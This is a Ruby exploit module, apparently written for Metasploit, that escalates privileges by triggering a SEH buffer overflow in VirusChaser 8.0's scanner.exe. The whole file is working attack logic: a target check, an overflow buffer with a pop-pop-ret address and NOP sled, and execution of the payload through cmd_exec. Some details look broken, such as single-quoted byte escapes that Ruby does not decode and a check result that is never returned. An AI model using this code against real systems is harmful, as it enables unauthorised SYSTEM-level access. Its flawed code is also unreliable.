##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Local

  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows VirusChaser v8.0 Privilege Escalation',
      'Description'   => %q{
          This module exploits a SEH overflow vulnerability in
          VirusChaser version 8.0. The vulnerability exists within
          VirusChasers `scanner.exe' program. When running this 
          executable from the command line, a SEH overflow can
          be achieved to get escalated privileges.
      },
      'License'       => MSF_LICENSE,
      'DisclosureDate'=> 'Apr 14 2017',
      'Author'        =>
        [
          'Carter Brainerd',  # Metasploit Module
          '0x41Li'            # PoC
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Payload'       => 
        {
          'BadChars'  => '\x00\x0d\x0a\x09\x22'
        },
      'References'    => 
        [
          [ 'EDB', '41887']
        ],
      'Targets'       =>
        [
          ['Automatic Target', { }]
        ]
    ))


  end

  def check
    vprint_status('Checking if target is a Windows system.')
    Exploit::CheckCode::Safe if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)
    
    vprint_status('Checking privileges')
    if is_system?
      print_good("This session already has SYSTEM privileges")
      return false
    end

    vprint_status('Checking for vulnerable executable.')
    if exist?('C:\\Program Files\\VirusChaser\\scanner.exe')
      puts "File Exists"
      Exploit::CheckCode::Appears 
    end

    Exploit::CheckCode::Safe
  end

  def payload_complete
    buf = 'A'*688                  # Junk to trigger the overflow
    jmp = '\xeb\x0b\x41\x41'       # JMP 0B
    ret = [0x10010c81].pack('L<')  # pop ECX #pop ESI #RET [sgbidar.dll]
    nop = '\x90'*24
    payload_full = buf + jmp + ret + nop + payload.encoded
    return payload_full
  end

  def run
    
    print_status("Checking if system is vulnerable")
    is_vuln = check
    return if is_vuln == Exploit::CheckCode::Safe || is_vuln == false

    print_status('Attempting to execute payload...')
    cmd_exec("C:\\\"Program Files\\VirusChaser\\scanner.exe\" \"" + payload_complete + "\"")

  end

end
